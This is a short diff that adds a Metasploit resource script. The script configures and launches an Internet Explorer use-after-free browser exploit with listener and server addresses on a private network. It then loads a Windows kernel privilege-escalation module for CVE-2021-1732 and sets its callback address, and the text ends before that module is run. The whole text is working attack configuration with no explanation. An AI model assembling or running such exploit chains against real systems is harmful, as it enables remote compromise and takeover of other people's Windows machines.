@@ -1,0 +1,13 @@
+
+use exploit/windows/browser/ie_removeattributenode_uaf
+set LHOST 172.16.29.1
+set LPORT 5555
+set SRVHOST 172.16.29.1 
+set SRVPORT 8081
+set URIPATH /
+exploit
+
+use exploit/windows/local/cve_2021_1732_win32k 
+set LHOST 172.16.29.1
+set LPORT 5556
+
